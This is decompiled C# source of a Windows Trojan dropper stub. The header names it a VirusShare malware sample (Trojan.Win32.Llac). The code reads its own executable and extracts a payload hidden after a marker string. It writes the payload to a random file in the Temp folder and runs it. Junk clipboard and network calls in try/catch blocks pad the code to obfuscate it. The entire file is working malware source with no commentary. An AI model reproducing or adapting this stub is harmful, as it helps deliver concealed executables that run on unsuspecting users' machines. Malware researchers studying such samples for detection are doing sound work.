// Decompiled with JetBrains decompiler
// Type: Osmanlı_Stub.Module1
// Assembly: Osmanlı Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 937F28D1-1BFB-4A0E-974D-3E388D9C91D5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Llac.zwx-1a577492c092cbb64b511c170ae920071d0441b9c8efc275f06d16ec990e55fb.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Osmanlı_Stub.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Osmanlı_Stub
{
  [DesignerGenerated]
  public class Module1 : Form
  {
    private IContainer components;
    private string ASgknAmdzxy;
    private string smnxyzhiyt5;
    private string wm4ff13o14e;
    private string bmwnngvIRam;
    private string svyheSqodRE;

    public Module1()
    {
      this.Load += new EventHandler(this.Module1_Load);
      this.svyheSqodRE = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\" + Path.GetRandomFileName().Replace(".", "") + ".$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Name = nameof (Module1);
      this.Text = "Form1";
      this.ResumeLayout(false);
    }

    public void Main()
    {
      try
      {
        MyProject.Computer.Network.IsAvailable.ToString().Replace(MyProject.Computer.Name, MyProject.User.Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.bmwnngvIRam = "#2lt@hn2#";
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read);
      try
      {
        MyProject.Computer.Clock.LocalTime.Date.Date.ToString().LastIndexOf(MyProject.Computer.Clipboard.GetText());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.ASgknAmdzxy = Strings.Space(checked ((int) FileSystem.LOF(1)));
      DateTime date = MyProject.Computer.Clock.LocalTime.Date.Date;
      date.ToString().LastIndexOf(MyProject.Computer.Clipboard.GetText());
      FileSystem.FileGet(1, ref this.ASgknAmdzxy);
      date = MyProject.Computer.Clock.LocalTime.Date.Date;
      date.ToString().LastIndexOf(MyProject.Computer.Clipboard.GetText());
      FileSystem.FileClose(1);
      try
      {
        MyProject.Computer.Network.IsAvailable.ToString().Replace(MyProject.Computer.Name, MyProject.User.Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.ASgknAmdzxy = this.ASgknAmdzxy.Substring(this.ASgknAmdzxy.LastIndexOf(this.bmwnngvIRam)).Replace(this.bmwnngvIRam, "");
      try
      {
        MyProject.Computer.Clock.LocalTime.Date.Date.ToString().LastIndexOf(MyProject.Computer.Clipboard.GetText());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.ASgknAmdzxy = this.ASgknAmdzxy.Replace("\0" + Conversions.ToString(Strings.Chr((int) byte.MaxValue)), "\0");
      try
      {
        MyProject.Computer.Clock.LocalTime.Date.Date.ToString().LastIndexOf(MyProject.Computer.Clipboard.GetText());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      FileSystem.FileOpen(2, this.svyheSqodRE, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Shared);
      try
      {
        MyProject.Computer.Network.IsAvailable.ToString().Replace(MyProject.Computer.Name, MyProject.User.Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      FileSystem.FilePut(2, this.ASgknAmdzxy, -1L, false);
      try
      {
        MyProject.Computer.Network.IsAvailable.ToString().Replace(MyProject.Computer.Name, MyProject.User.Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      FileSystem.FileClose(2);
      try
      {
        MyProject.Computer.Clock.LocalTime.Date.Date.ToString().LastIndexOf(MyProject.Computer.Clipboard.GetText());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Interaction.Shell(this.svyheSqodRE, AppWinStyle.NormalFocus);
      try
      {
        MyProject.Computer.Network.IsAvailable.ToString().Replace(MyProject.Computer.Name, MyProject.User.Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

    private void Module1_Load(object sender, EventArgs e)
    {
      try
      {
        MyProject.Computer.Clock.LocalTime.Date.Date.ToString().LastIndexOf(MyProject.Computer.Clipboard.GetText());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Main();
      try
      {
        MyProject.Computer.Network.IsAvailable.ToString().Replace(MyProject.Computer.Name, MyProject.User.Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
